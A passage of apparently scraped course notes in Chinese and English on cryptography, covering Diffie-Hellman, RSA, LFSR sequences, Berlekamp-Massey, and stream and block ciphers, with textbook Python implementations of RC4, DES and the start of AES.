key establishment, cipher suite negotiation, failure detection.  课堂笔记 #  Diffie-Hellman key exchange (DH) #  用于在两个终端之间共享一个私密的数字：\n此时两个终端直接就共享了一个私密信息：$$\\displaystyle g^{X_A X_B}\\pmod{p}$$\npublic-key crypto-systems (RSA) #  The keys for the RSA algorithm are generated the following way:\n Choose two distinct prime numbers p and q  For security purposes, the integers p and q should be chosen at random, and should be similar in magnitude but differ in length by a few digits to make factoring harder.[2] Prime integers can be efficiently found using a primality test.   Compute n = pq  n is used as the modulus for both the public and private keys. Its length, usually expressed in bits, is the key length.   Compute $$\\phi(n) = lcm(\\phi(p), \\phi(q)) = lcm(p − 1, q − 1)$$, where $$\\phi$$ is Carmichael\u0026rsquo;s totient function. This value is kept private. Choose an integer e such that 1 \u0026lt; e \u0026lt; λ(n) and gcd(e, λ(n)) = 1; i.e., e and λ(n) are coprime. Determine d as d ≡ e−1 (mod λ(n)); i.e., d is the modular multiplicative inverse of e modulo λ(n).  "},{"id":186,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/2.prsg/","title":"2. Prsg","section":"算法和协议中的安全机制","content":"Chapter 2. Pseudorandom Sequence Generators #  Background #  We focus on the deterministic algorithm:\n One is linear/non-linear feedback shift registers based on PRSGs. One relies on computation infeasible problems or other types of maths structure.  Feedback Shift Register Sequence #  Feedback shift register (反馈位移寄存器), denotes as FSR：\n  Introduction to FSR: feedback function $$a_{k+n} = f(a_k, a_{k+1}, \\cdots, a_{k+n-1})$$\n  A state diagram of an FSR\n  FSRs with maximum periods:\n Maximum periods of an n-stage FSR sequence: $$2^n$$. Referred to as de Bruijn sequence. Maximum periods of an n-stage LFSR sequence: $$2^n - 1$$. Referred to as m-sequence.    LFSR and m-sequence #  Definition and properties #  Definition (Characteristic polynomial):\n For feedback function: $$f(x_0, x_1, \u0026hellip;, x_{n-1}) = c_{n-1}x_{n-1} +\u0026hellip; +c_1x_1 + c_0 x_0$$ $$f(x) = x^n + c_{n-1}x^{n-1} +\u0026hellip; +c_1x^1 + c_0 x^0$$ is called **characteristic polynomial**  Definition (Minimal polynomial):\n For a given sequence $${a_i} = {a_0, a_1, \\cdots, a_{n-1}}$$ The characteristic polynomial with the smallest degree generating $${a_i}$$ is called minimal polynomial  Property:\n The minimal polynomial of an LFSR is a divisor of its characteristic polynomial.  Property (m-sequence and its feedback polynomial):\n The period of the sequence $${a_i}$$ is equal to the period of its minimal polynomial. So in order to design an m-sequence, we need to find a primitive polynomial.($$\\deg f(x) = n$$)  Property:\n All m-sequences generated by the same LFSR are shift equivalent.  Common equations:\n $$\\displaystyle \\underbrace{0, \\cdots, 0}_{n-1},1 \\Rightarrow f(x) = x^n + 1$$ $$\\displaystyle \\underbrace{1, \\cdots, 1}_{n-1}, 0 \\Rightarrow f(x) = x^{n-1}(x+1) + 1$$  Linear span and BM algorithm #  Definition (linear span):\n  For a given sequence $${a_i} = {a_0, a_1, \\cdots, a_{n-1}}$$\n  We define the degree of the minimal polynomial of a as linear span (linear complexity) of a, denotes as LS(a). Berlekamp-Massey algorithm can be used to calculate LS(a)\n  Property:\n For a given sequence $${a_i} = {a_0, a_1, \\cdots, a_{n-1}}$$, linear span of first N bit denotes as $$L_N$$ Then we have: $$L_{N+1} = L_N \\or (N+1-L_N)$$  Definition (Discrepancy sequences):\n For a given sequence $$a^N = a_0, a_1, \\cdots, a_{N-1}$$ Let $$\\displaystyle f(x) = x^l + \\sum_{i=0}^{l-1}c_ix^i$$ be the minimal polynomial of LFSR. Let $$\\displaystyle v_k = a_{l+k} + \\sum_{i = 0}^{l - 1} c_i a_{i+k}, k = 0,1, \\cdots, N-l-1$$ $${V_k}$$ is called discrepancy sequence associated with f(x) and $$a^N$$  Lemma:\n Assume that $$f_{n-1}(x)$$ is the characteristic polynomial of the shortest LFSR generating $$a_0, a_1, \\cdots, a_{n-1}$$, but not $$a_0, a_1, \\cdots, a_{n}, n \u0026lt; N$$. In the other word (Assuming $$LS(f(x)) = l_{n-1}$$):  For $$k=0,1,\\cdots, n-1-l_{n-1}$$, we have $$\\displaystyle a_{l_{n-1}+k} = \\sum_{i=0}^{l_{n-1}-1}a_{i+k} \\Rightarrow v_k = 0$$ But for $$k = n - l_{n-1} \\Rightarrow v_k = 1$$   Consider discrepancy sequences: $$\\displaystyle (v_0, v_1, \\cdots, v_{n - l_{n-1}}) = (\\underbrace{0, \\cdots,0}_{n - l_{n-1}}, 1)$$ How to obtain $$f_n$$ from the previous $$f_i, i \u0026lt; n$$?  Find the nearest LFSR such that $$l_{m-1} \u0026lt; l_{m} = \\cdots = l_{n-1}$$ Assuming $$a = m - l_{m-1}, b = n - l_{n-1}$$, we can obtain f: $$f_n(x) = \\begin{cases} f_{n-1} + x^d f_{m-1}, \u0026amp; d = a - b, a \u0026gt; b \\ x^d f_{n-1} + f_{m-1}, \u0026amp; d = b - a, a \\le b\\end{cases}$$    Algorithm (Berlekamp-Massey) python code (it seems couldn\u0026rsquo;t run):\n#!/usr/bin/env python2.7 # coding=utf-8 from sage.all import * class BMSolution: def __init__(self, capturedSequence): self.x = var(\u0026#34;x\u0026#34;) self.Z = GF(2) capturedSequence = [self.Z(bit) for bit in capturedSequence] self.rawSequence = capturedSequence self.initializePolynomial() def initializePolynomial(self): self.k = self.rawSequence.index(1) # 第一个 1 bit self.minimalPolynomial = self.x ** (self.k+1) + 1 # f(x), 当前的最小多项式 self.m = 0 # 前一个多项式所在的最后的位置 self.prevMinPolynomial = 1 # g(x), 之前的一个最小多项式 def solvePolynomial(self): for n in range(self.k, len(self.rawSequence)): l = self.minimalPolynomial.degree(self.x) d = sum([self.minimalPolynomial.coefficient(self.x, i) * self.rawSequence[n - l + i] for i in range(l + 1)]) % 2 if d == 0: continue a = (self.m - self.prevMinPolynomial.degree(self.x)) b = (n - self.minimalPolynomial.degree(self.x)) if 2*l \u0026gt; n: self.minimalPolynomial = self.minimalPolynomial - self.x ** (a - b) * self.prevMinPolynomial else: prevMinPolynomial = self.minimalPolynomial self.minimalPolynomial = self.x ** (b - a) * self.minimalPolynomial - self.prevMinPolynomial self.prevMinPolynomial = prevMinPolynomial return self.minimalPolynomial if __name__ == \u0026#34;__main__\u0026#34;: sp = BMSolution([0,0,0,1,1,1,0,1,0,1]) print(sp.solvePolynomial()) PostScript: 可以直接在 sagemath 中使用下面的方式求解：\nberlekamp_massey([0,0,0,1,0,1,0,1]) # x^2 - 1 Property:\n If 2n (n is the linear span) bits are known in an N bits long sequence, we can recover the rest of bits.  Correlation function #  Goal:\n Correlation function measure the similarity one sequence with a shift of the other.  Definition (when periods are the same N):\n $$\\displaystyle C_{a, b}(\\tau) = \\sum_{i = 0}^{N - 1} (-1)^{a_i + b_i + \\tau}$$ It\u0026rsquo;s equal to the difference between the number of the agreements and that of disagreements of a with the shift t.  Definition (when period are different N and M):\n Assume $$T = lcm(N, M)$$, $$\\displaystyle C_{(a^T, b)} (\\tau) = \\sum_{i = 0}^{T - 1} (-1)^{a_i + b_i +\\tau}$$  Randomness #  Golomb\u0026rsquo;s Randomness Postulates #  R-1 Blance property:\n 0 and 1 has the same possibility  R-2 run property:\n A periodic sequence is said to have the run property if in every period of the sequence, there are $$2^k$$ runs of length n-k where $$n = logN, 1 \\le k \\lt n$$. Moreover, for each of these lengths, there are equally many runs of 0\u0026rsquo;s and of 1\u0026rsquo;s.  R-3 Idea 2-level autocorrelation:\nRandomness Criteria #   Large period Statistics properties:  Balanced property: each element occurs nearly equally many times; Run property R2; (ideal) k-tuple distribution; Each non-zero k-tuple occurs exactly one.   Correlation:  2-level autocorrelation Low crosscorrelation   Large linear span (complexity). $$\\displaystyle \\frac{tN}{2} \\le LS(a) \\le N, \\text{where t is constant}, 0 \\lt t \\le 1$$ Indistinguishability.  Generators #   Non-linear generator Filtering sequence generator Combination sequence generator Select boolean generator Clock control \u0026amp; shrink generator Stop and go generator Shrink generator  One-Time Pad #  Known Attack #  Correlation attack #  A naive way to conduct an attack is to do an exhaustive search for the entire space for a possible internal state, then the search complexity is given by: $$\\displaystyle T_0 = \\prod_{i=0}^{m-1} 2^{n_i}$$\nIf we can decompose the PRSG into m sub-generators, those m sub-generators are filtered by a boolean function h: $$Z = h(X_0, X_1, \\cdots, X_{m-1})$$.\nWe now look at whether the output random variable Z and input variable $$X_i$$ are correlated. Using this fact, the search complexity can be tremendously reduced to approximately:\n $$\\displaystyle T_1 = \\sum_{i \\in I_c} 2^{n_i} + \\prod_{i \\in I_{uc}}2^{n_i}$$ where $$\\begin{cases}I_c = {i | 0 \\le i \u0026lt; m,\u0026amp; Z\\text{ and }X_i\\text{ are correlated}} \\ I_{uc} = {i | 0 \\le i \u0026lt; m,\u0026amp; Z\\text{ and }X_i\\text{ are uncorrelated}} \\end{cases}$$  课堂笔记 #  有限域 #  需要一个随机性、算法速度兼顾的算法。\n所以我们考虑以下的运算：异或、移位、加减法、布尔函数\u0026hellip;\n定义（Finite Field）：记作 $$\\mathbb{F}_n$$\n 对于 + 运算：存在 0 元；对于任意元素，存在一个其加法运算的负元。 对于 * 运算：存在 1 元；对于任意元素，存在一个其乘法的逆元。  定理：\n  对于 p 是素数，$$\\mathbb{Z}_p = \\mathbb{F}_p$$\n  Expansion：$$\\displaystyle \\mathbb{F}p \\Rightarrow \\mathbb{F}{p^n}$$\n  如何从 $$\\mathbb{F}2$$ 构造 $$\\mathbb{F}{2^n}$$：\n  令 $$GF(2^n) = {x_0 + x_1 \\alpha + \u0026hellip; + x_{n-1} \\alpha^{n-1}\\text{, where } x_i \\in \\mathbb{F_2}}$$\n  那么我们可以构造：$$\\displaystyle \\mathbb{F}_4 = \\frac{GF(2)}{p(x)}\\text{, where }\\deg{p(x)} = n, p(x):irreducible$$\n  表示方法：\n polynomial representation:$$x_0 + x_1\\alpha + x_2 \\alpha^2 +\u0026hellip; + x_{n-1}\\alpha^{n-1}$$ vector based representation:$$(x_0, x_1,\u0026hellip;, x_{n-1})$$ Exponential representation:$${\\alpha^i, i = 0,1,\u0026hellip;,2^{n}-2}$$  定义（Multiplicative Group）：\n $$\\displaystyle GF(2^n)^{*} = GF(2^n)\\text{\\}{0} = {\\alpha^i, i = 0,1,\u0026hellip;,2^{n}-2}$$  Group #  定义：\n  Associative: $$a * (bc) = (ab)*c$$\n  Identity: $$\\exist e \\in G, ae = ea = a$$\n  $$\\forall a \\in G, \\exist a^{-1}, \\text{so that }a * a^{-1} = e$$\n  $$\\text{For }a, b \\in G, ab = ba \\Rightarrow$$ Commutative Group 交换群\n  Primitive #  定义：考虑在 $$GF(2^n)^*$$ 中：\n  $$ord \\beta$$: the least integer m such that $$\\beta^m = 1$$\n  primitive: We say $$\\beta$$ is primitive if $$ord \\beta = 2^n - 1$$\n  定理：\n  $$\\alpha$$ is a root of $$f(x)$$, then $$\\alpha^{2^i}, i = 0,1,\u0026hellip;,n-1$$ are root of $$f(x)$$\n  $$\\displaystyle ord \\alpha^s = \\frac{ord \\alpha}{gcd(s, ord \\alpha)}$$\n  Feedback Shift Register Sequences #  Maximum Periods #  我们发现：\n Output bits are closely related to feedback function, and internal states  m-sequence #  性质：\n  定义操作符 L：$$(a_0, a_1, \u0026hellip;, a_{n-1}) \\rightarrow (a_1, a_2, \u0026hellip;, a_n)$$\n  对于特征多项式，我们总有：$$\\displaystyle f(L)*\\overset{\\rightarrow}{a} = 0$$\n  性质：\n 如果 f(x), g(x) 是特征多项式，我们有：$$f(x) + g(x), x^i *f(x), h(x) * f(x)$$ 也是特征多项式  有 Caylor-Hamilton Theorem：\n  对于 FSRS 的转移矩阵 M，\n  If $$f(x) | x^r -1 \\Rightarrow M^r = I \\Rightarrow$$ Internal state repeats at the period r\n  定义：\n 如果我们连个 LFSR 通过同一个转移函数得到，则我们称他们为 shift equivalent  linear span #  定义：\n An LFSR s said to generate a finite sequence $$a_0, a_1, \u0026hellip;, a_{N-1}$$ when the this sequence conincides with the first N output elements of l-stage LFSR for the initial state $$(a_0, a_1,\u0026hellip;,a_{l-1})$$. The shortest length of the LFSR which generate $$a^N$$ is called the linear span of $$a^N$$.  Discrepancy Sequences #  对于一个给定的序列，Discrepancy Sequences 是一个构造生成给定序列的 LFSR 的方法。\n因为特殊的我们有：$$00\\dots001 \\Rightarrow f(x) = x^n +1$$\n我们又知道 $$\\displaystyle f_n(x) \\begin{cases}f_{n-1} + x^d f_{m-1}, d = a-b,\\text{if }a\u0026gt;b \\ x^df_{n-1} + f_{m-1}, d = b-a, \\text{if }a \\le b \\end{cases}$$\nCorrelation Functions of Sequences #  Mesure the similarity of one sequence with a shift of the other.\nDefine the two sequences correlation function with the same period N: $$\\displaystyle C_{a,b}(\\tau) = \\sum_{i = 0}^{N-1} (-1)^{a_i + b_i + \\tau}$$\n$$C_a(t)$$ measures the similarity between the sequence and its shift, euqal to the difference between the number of the agreements and that of disagreements of a with the shift t.\nDefined for two sequences a and b with their respective lengths N and M: $$\\displaystyle C_{a^T, b} (\\tau) \\sum_{i = 0}^{T-1} (-1)^{a_i + b_i + \\tau}, \\tau = 0,1,\\dots, T = lcm(N, M)$$\n"},{"id":187,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/3.streamciphers/","title":"3. Stream Ciphers","section":"算法和协议中的安全机制","content":"Chapter 3. Design of Stream Ciphers #  Overview #  Two phases in stream cipher:\n key initialization phase.(KIA) PRSG running phase.  Design princinple #  Typical stream Ciphers #  A5/1 in GSM #  Cipher flow:\n上图中，A5/1 部分就是基于一个密钥的随机数生成器，它主要由以下三个部分组成：\n  It uses three LFSRs generating m-sequences of large periods\nwhich is: $$\\displaystyle \\begin{cases} f_1(x) = x^{19} + x^5 + x^2 + x + 1 \\ f_2(x) = x^{22} + x + 1 \\ f_3(x) = x^{23} + x^{16} + x^2 + x +1 \\end{cases}$$\n  Tap positions: $$d_1 = 11, d_2 = 12, d_3 = 13$$.\n  Majority function.\n  LFSR working flow:\nKIA phase:\n For session key $$K = (k_0, \\cdots, k_{63})$$, and a frame counter number $$N = (n_0, \\cdots, n_{21})$$. Let S be the concatenation of K and N. （这里还有，懒得写了）  A5/1 is very weak. (Weakness: short period, majority rule, short key length.)\nE0 in Bluetooth #  RC4 in WEP #  WEP:\n The wire equivalent privacy (WEP) algorithm is used to protect wireless communication from eavesdropping; prevent unauthorized access to a wireless network.  KIA phase pseudocode：\nKIA(K)\rInitialization:\rfor i in range(2^n):\rS[i] = i\rScrambling:\rj = 0\rfor i in range(2^n):\rj = j + S[i] + K[i % l]\rswap(S[i], S[j])\rPRSG phase pseudocode:\nPRSG(S):\rInitialization:\ri =0, j = 0\rGeneration Loop:\ri = i+1\rj = j + S[i]\rswap(S[i], S[j])\rt = (S[i] + S[j]) mod N\ryield S[t]\rImplement in python from github:\n#!/usr/bin/env python def KSA(key): keylength = len(key) S = range(256) j = 0 for i in range(256): j = (j + S[i] + key[i % keylength]) % 256 S[i], S[j] = S[j], S[i] # swap return S def PRGA(S): i = 0 j = 0 while True: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] # swap K = S[(S[i] + S[j]) % 256] yield K def RC4(key): S = KSA(key) return PRGA(S) if __name__ == \u0026#39;__main__\u0026#39;: # test vectors are from http://en.wikipedia.org/wiki/RC4 # ciphertext should be BBF316E8D940AF0AD3 key = \u0026#39;Key\u0026#39; plaintext = \u0026#39;Plaintext\u0026#39; # ciphertext should be 1021BF0420 #key = \u0026#39;Wiki\u0026#39; #plaintext = \u0026#39;pedia\u0026#39; # ciphertext should be 45A01F645FC35B383552544B9BF5 #key = \u0026#39;Secret\u0026#39; #plaintext = \u0026#39;Attack at dawn\u0026#39; def convert_key(s): return [ord(c) for c in s] key = convert_key(key) keystream = RC4(key) import sys for c in plaintext: sys.stdout.write(\u0026#34;%02X\u0026#34; % (ord(c) ^ keystream.next())) print PRSG phase can be illustrated by the following state transition graph:\nWG Stream Cipher #  The WG stream cipher can be explained as following formula:\n  Initialize $$a_0, \\cdots, a_l$$ with given key with l length.\n  Updating: $$\\displaystyle a_{k+l} = \\begin{cases}\\displaystyle \\sum_{i=0}^{l-1}c_i a_{i+k} + WGperm(a_{k+l-1}) \u0026amp; 0 \\le k \u0026lt; 2l,\u0026amp; \\text{KIA phase} \\ \\displaystyle \\sum_{i=0}^{l-1} c_i a_{i+k} \u0026amp; k \\ge 2l, \u0026amp; \\text{running phase}\\end{cases}$$\n  Output: $$s_k = WG(a_{k +2l + l-1})$$\n  Cipher flow:\n"},{"id":188,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/4.block-hash-mac/4.1.blockciphers/","title":"4.1. Block Ciphers","section":"4.Block-Hash-MAC","content":"Block Cipher #  Overview #  property:\n Diffusion: any bits from the input message should affect whole cipher text. Confusion: with different key, the cipher message should be completely different.  块加密可以用以下一个函数表示：$$C = E_k(x) = f(x, k), x,k,C \\in \\mathbb{F}_2^{(n)}$$\nRequirements of f:\n Nonelinearity: a minimum distance between f and all the linear, affine functions (confusion). Resist linear cryptanalysis. Strict Avalanche Criterion(SAC): One bit change, resulting in significant changes (diffusion). Resist differential cryptanalysis.  Structure of block ciphers:\n  Feistel structure, which is an NLFSR (nonlinear feedback shift register) with input.\n  Substitute permutation network (SPN) structure\n  Data encryption standard (DES) #  DES: Data Encryption Standard, NIST, 1976.\nPython code: github:\n#-*- coding: utf8 -*- #Initial permut matrix for the datas PI = [58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4, 62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16, 8, 57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, 11, 3, 61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7] #Initial permut made on the key CP_1 = [57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18, 10, 2, 59, 51, 43, 35, 27, 19, 11, 3, 60, 52, 44, 36, 63, 55, 47, 39, 31, 23, 15, 7, 62, 54, 46, 38, 30, 22, 14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 28, 20, 12, 4] #Permut applied on shifted key to get Ki+1 CP_2 = [14, 17, 11, 24, 1, 5, 3, 28, 15, 6, 21, 10, 23, 19, 12, 4, 26, 8, 16, 7, 27, 20, 13, 2, 41, 52, 31, 37, 47, 55, 30, 40, 51, 45, 33, 48, 44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32] #Expand matrix to get a 48bits matrix of datas to apply the xor with Ki E = [32, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9, 8, 9, 10, 11, 12, 13, 12, 13, 14, 15, 16, 17, 16, 17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25, 24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32, 1] #SBOX S_BOX = [ [[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7], [0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8], [4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0], [15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13], ], [[15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10], [3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5], [0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15], [13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9], ], [[10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8], [13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1], [13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7], [1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12], ], [[7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15], [13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9], [10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4], [3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14], ], [[2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9], [14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6], [4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14], [11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3], ], [[12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11], [10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8], [9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6], [4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13], ], [[4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1], [13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6], [1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2], [6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12], ], [[13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7], [1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2], [7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8], [2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11], ] ] #Permut made after each SBox substitution for each round P = [16, 7, 20, 21, 29, 12, 28, 17, 1, 15, 23, 26, 5, 18, 31, 10, 2, 8, 24, 14, 32, 27, 3, 9, 19, 13, 30, 6, 22, 11, 4, 25] #Final permut for datas after the 16 rounds PI_1 = [40, 8, 48, 16, 56, 24, 64, 32, 39, 7, 47, 15, 55, 23, 63, 31, 38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61, 29, 36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27, 34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41, 9, 49, 17, 57, 25] #Matrix that determine the shift for each round of keys SHIFT = [1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1] def string_to_bit_array(text):#Convert a string into a list of bits array = list() for char in text: binval = binvalue(char, 8)#Get the char value on one byte array.extend([int(x) for x in list(binval)]) #Add the bits to the final list return array def bit_array_to_string(array): #Recreate the string from the bit array res = \u0026#39;\u0026#39;.join([chr(int(y,2)) for y in [\u0026#39;\u0026#39;.join([str(x) for x in _bytes]) for _bytes in nsplit(array,8)]]) return res def binvalue(val, bitsize): #Return the binary value as a string of the given size  binval = bin(val)[2:] if isinstance(val, int) else bin(ord(val))[2:] if len(binval) \u0026gt; bitsize: raise \u0026#34;binary value larger than the expected size\u0026#34; while len(binval) \u0026lt; bitsize: binval = \u0026#34;0\u0026#34;+binval #Add as many 0 as needed to get the wanted size return binval def nsplit(s, n):#Split a list into sublists of size \u0026#34;n\u0026#34; return [s[k:k+n] for k in range(0, len(s), n)] ENCRYPT=1 DECRYPT=0 class des(): def __init__(self): self.password = None self.text = None self.keys = list() def run(self, key, text, action=ENCRYPT, padding=False): if len(key) \u0026lt; 8: raise \u0026#34;Key Should be 8 bytes long\u0026#34; elif len(key) \u0026gt; 8: key = key[:8] #If key size is above 8bytes, cut to be 8bytes long self.password = key self.text = text if padding and action==ENCRYPT: self.addPadding() elif len(self.text) % 8 != 0:#If not padding specified data size must be multiple of 8 bytes raise \u0026#34;Data size should be multiple of 8\u0026#34; self.generatekeys() #Generate all the keys text_blocks = nsplit(self.text, 8) #Split the text in blocks of 8 bytes so 64 bits result = list() for block in text_blocks:#Loop over all the blocks of data block = string_to_bit_array(block)#Convert the block in bit array block = self.permut(block,PI)#Apply the initial permutation g, d = nsplit(block, 32) #g(LEFT), d(RIGHT) tmp = None for i in range(16): #Do the 16 rounds d_e = self.expand(d, E) #Expand d to match Ki size (48bits) if action == ENCRYPT: tmp = self.xor(self.keys[i], d_e)#If encrypt use Ki else: tmp = self.xor(self.keys[15-i], d_e)#If decrypt start by the last key tmp = self.substitute(tmp) #Method that will apply the SBOXes tmp = self.permut(tmp, P) tmp = self.xor(g, tmp) g = d d = tmp result += self.permut(d+g, PI_1) #Do the last permut and append the result to result final_res = bit_array_to_string(result) if padding and action==DECRYPT: return self.removePadding(final_res) #Remove the padding if decrypt and padding is true else: return final_res #Return the final string of data ciphered/deciphered def substitute(self, d_e):#Substitute bytes using SBOX subblocks = nsplit(d_e, 6)#Split bit array into sublist of 6 bits result = list() for i in range(len(subblocks)): #For all the sublists block = subblocks[i] row = int(str(block[0])+str(block[5]),2)#Get the row with the first and last bit column = int(\u0026#39;\u0026#39;.join([str(x) for x in block[1:][:-1]]),2) #Column is the 2,3,4,5th bits val = S_BOX[i][row][column] #Take the value in the SBOX appropriated for the round (i) bin = binvalue(val, 4)#Convert the value to binary result += [int(x) for x in bin]#And append it to the resulting list return result def permut(self, block, table):#Permut the given block using the given table (so generic method) return [block[x-1] for x in table] def expand(self, block, table):#Do the exact same thing than permut but for more clarity has been renamed return [block[x-1] for x in table] def xor(self, t1, t2):#Apply a xor and return the resulting list return [x^y for x,y in zip(t1,t2)] def generatekeys(self):#Algorithm that generates all the keys self.keys = [] key = string_to_bit_array(self.password) key = self.permut(key, CP_1) #Apply the initial permut on the key g, d = nsplit(key, 28) #Split it in to (g-\u0026gt;LEFT),(d-\u0026gt;RIGHT) for i in range(16):#Apply the 16 rounds g, d = self.shift(g, d, SHIFT[i]) #Apply the shift associated with the round (not always 1) tmp = g + d #Merge them self.keys.append(self.permut(tmp, CP_2)) #Apply the permut to get the Ki def shift(self, g, d, n): #Shift a list of the given value return g[n:] + g[:n], d[n:] + d[:n] def addPadding(self):#Add padding to the datas using PKCS5 spec. pad_len = 8 - (len(self.text) % 8) self.text += pad_len * chr(pad_len) def removePadding(self, data):#Remove the padding of the plain text (it assume there is padding) pad_len = ord(data[-1]) return data[:-pad_len] def encrypt(self, key, text, padding=False): return self.run(key, text, ENCRYPT, padding) def decrypt(self, key, text, padding=False): return self.run(key, text, DECRYPT, padding) if __name__ == \u0026#39;__main__\u0026#39;: key = \u0026#34;secret_k\u0026#34; text= \u0026#34;Hello wo\u0026#34; d = des() r = d.encrypt(key,text) r2 = d.decrypt(key,r) print(\u0026#34;Ciphered: %r\u0026#34; % r) print(\u0026#34;Deciphered: \u0026#34;, r2) Advanced Encryption Standard (AES) #  AES: Advanced Encryption Standard\nPython code github:\n#!/usr/bin/env python \u0026#34;\u0026#34;\u0026#34; Copyright (C) 2012 Bo Zhu http://about.bozhu.me Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \u0026#34;Software\u0026#34;), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED \u0026#34;AS IS\u0026#34;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. \u0026#34;\u0026#34;\u0026#34; Sbox = ( 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 